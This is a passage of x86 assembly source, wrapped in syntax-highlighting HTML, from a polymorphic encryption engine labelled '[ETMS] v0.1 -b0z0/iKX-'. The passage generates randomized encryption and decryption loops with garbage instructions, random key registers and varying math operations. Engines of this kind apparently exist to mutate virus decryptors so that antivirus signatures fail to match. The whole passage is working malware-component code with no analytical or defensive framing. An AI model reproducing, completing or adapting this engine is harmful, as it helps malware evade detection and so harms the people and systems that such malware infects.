        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; add lenght if from end</span><span class="sc0">

</span><span class="sc5">no_adding2</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; copy what to encrypt</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b9h</span><span class="sc0">                    </span><span class="sc1">; mov ecx</span><span class="sc0">
</span><span class="sc5">v_initkey</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; initial key value</span><span class="sc0">

</span><span class="sc5">enc_max</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc1">; lenghts</span><span class="sc0">
</span><span class="sc1">; 6     = max encryption operation</span><span class="sc0">
</span><span class="sc1">; 4     = max 4 inc/dec counter</span><span class="sc0">
</span><span class="sc1">; 4     = max 4 inc/dec counter</span><span class="sc0">
</span><span class="sc1">; 3 * 6 = max 3 * 6 byte key change operations</span><span class="sc0">

</span><span class="sc5">enc_space</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">enc_max</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">; here the encryptor will be placed</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">enc_space</span><span class="sc0">               </span><span class="sc1">; loop</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">; total lenght</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">; poly finished</span><span class="sc0">
</span><span class="sc1">; - ETMS return point</span><span class="sc0">

</span><span class="sc5">poly_name</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'[ETMS] v0.1 -b0z0/iKX-'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">make_jmpback</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_garbage</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0e9h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_chgpnt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_loopbg</span><span class="sc4">)]</span><span class="sc0">
                                                </span><span class="sc1">; the jump back to start of</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                         </span><span class="sc1">; the decryptor</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_garbage</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">; calculate lenght of jump and return</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">; with it</span><span class="sc0">

</span><span class="sc5">put_encloop_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">put_encloop</span><span class="sc0">
</span><span class="sc5">put_encloop_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">put_encloop</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; ecx nr of bytes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_encrypt</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; in EDI where we are in enc</span><span class="sc0">
                                                </span><span class="sc1">; and save dec position</span><span class="sc0">
</span><span class="sc5">copy_it</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">copy_it</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_encrypt</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">   </span><span class="sc1">; save next and restore dec pnt</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">o_table</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">o_counter</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ch_counter</span><span class="sc0">
</span><span class="sc5">o_pointer</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ch_pointer</span><span class="sc0">
</span><span class="sc5">o_key</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ch_key</span><span class="sc0">
</span><span class="sc5">o_mate</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ch_mate</span><span class="sc0">

</span><span class="sc5">ch_counter</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">; decrement/increment counter</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">                  </span><span class="sc1">; dec</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                  </span><span class="sc1">; counter in enc uses EDX</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">put_encloop_1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_chgpnt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_countback</span><span class="sc4">)],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">decrementing</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                  </span><span class="sc1">; else incrementing counter</span><span class="sc0">
</span><span class="sc5">decrementing</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_chgpnt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">r_counter</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ch_pointer</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">; increment/decrement pointer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; inc</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_chgpnt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_fromend</span><span class="sc4">)],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">straight_up</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
</span><span class="sc5">straight_up</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                  </span><span class="sc1">; ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">put_encloop_1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_chgpnt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">r_pointer</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ch_key</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">; change key register</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_chgpnt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">r_regkey</span><span class="sc4">)],</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exit_keychange</span><span class="sc0">
</span><span class="sc5">get_modifier</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_al7</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">get_modifier</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">key_changers</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">          </span><span class="sc1">; add/sub/xor base</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">no_rrrr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c1h</span><span class="sc0">         </span><span class="sc1">; rol/ror base</span><span class="sc0">
</span><span class="sc5">no_rrrr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">reget_ksize</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">      </span><span class="sc1">; select if byte/word/dword</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">011b</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">reget_ksize</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">          </span><span class="sc1">; inc dec just on dw and dd</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">isntincdec</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">reget_ksize</span><span class="sc0">
</span><span class="sc5">isntincdec</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_chgpnt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">r_regkey</span><span class="sc4">)],</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">canall</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01b</span><span class="sc0">          </span><span class="sc1">; byte keychange only for ax,cx,dx,bx</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">reget_ksize</span><span class="sc0">
</span><span class="sc5">canall</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_decbyte</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">no_decbyte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_wordprefix</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">put_encloop_1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">no_wordprefix</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">no_incdecch</span><span class="sc0">             </span><span class="sc1">; inc/dec has just one byte opcode</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">no_incdecch</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">no_nopneeded</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; ecx key in enc loop</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">put_encloop_1</span><span class="sc0">   </span><span class="sc1">; for inc/dec</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">after_store</span><span class="sc0">
</span><span class="sc5">no_nopneeded</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; key is ECX in enc loop</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">put_encloop_2</span><span class="sc0">
</span><span class="sc5">after_store</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_chgpnt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">r_regkey</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">05</span><span class="sc0">           </span><span class="sc1">; inc/dec doesn't need any key</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">exit_keychange</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">just_one_bk</span><span class="sc0">     </span><span class="sc1">; ror/rol just one byte key</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">just_one_bk</span><span class="sc0">     </span><span class="sc1">; check dimension of key modifier</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">put_encloop_1</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">just_one_bk</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">put_encloop_2</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">just_one_bk</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">put_encloop_1</span><span class="sc0">
</span><span class="sc5">exit_keychange</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ch_mate</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">; creates the decryption math operation</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5h</span><span class="sc0">
</span><span class="sc5">type_sel</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">ok_regs</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">type_sel</span><span class="sc0">        </span><span class="sc1">; get type and size.. in EDX size, in EAX type</span><span class="sc0">
                                </span><span class="sc1">; edx = 0 for byte, 1 for word, 2 for dword</span><span class="sc0">
</span><span class="sc5">ok_regs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_chgpnt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">r_regkey</span><span class="sc4">)],</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_math_imm</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">without_key</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_math_key</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_math_imm</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">without_key</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; type - 1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; each type is a word</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">                   </span><span class="sc1">; ax = mathop word</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_word</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">066h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">put_encloop_1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">not_word</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">not_byte</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">not_byte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; type - 1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">

